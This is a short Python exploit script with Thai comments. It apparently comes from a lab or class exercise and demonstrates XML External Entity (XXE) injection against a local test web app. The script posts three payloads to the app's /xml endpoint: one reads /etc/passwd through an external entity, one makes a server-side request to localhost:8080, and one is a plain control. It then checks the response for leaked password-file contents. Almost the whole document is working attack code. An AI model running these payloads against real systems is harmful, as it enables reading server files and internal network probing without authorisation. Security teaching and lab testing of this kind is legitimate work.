import requests

# URL ของแอปที่คุณรันด้วย ./start.sh [cite: 53, 60]
url = "http://192.168.109.131:5000/xml" 

# รายการ Payloads สำหรับทดสอบสถานการณ์ต่างๆ [cite: 82, 86, 95]
payloads = {
    "1. Read System File (/etc/passwd)": """<?xml version="1.0"?>
        <!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <root>&xxe;</root>""",
    
    "2. Access Local Resource (SSRF)": """<?xml version="1.0"?>
        <!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://localhost:8080"> ]>
        <root>&xxe;</root>""",
    
    "3. Basic XML Test (Sanity Check)": """<?xml version="1.0"?>
        <root>Normal XML Test</root>"""
}

def run_bonus_exploit():
    print("--- XXE Automated Vulnerability Demonstration ---")
    
    for description, xml_content in payloads.items():
        print(f"\n[+] Testing: {description}")
        
        try:
            # ส่งข้อมูลผ่าน POST request ไปยังฟิลด์ 'xml' ตามที่ปรากฏใน HTML [cite: 96]
            response = requests.post(url, data={'xml': xml_content}, timeout=5)
            
            print(f"Status: {response.status_code}")
            print(f"Result Preview: {response.text[:200]}...") # แสดงผลลัพธ์บางส่วน
            
            # ตรวจสอบว่าสามารถอ่านไฟล์ได้จริงหรือไม่ (เป้าหมายหลัก) [cite: 74, 78]
            if "root:x:0:0" in response.text:
                print(">>> SUCCESS: Sensitive data leaked!")
                
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    run_bonus_exploit()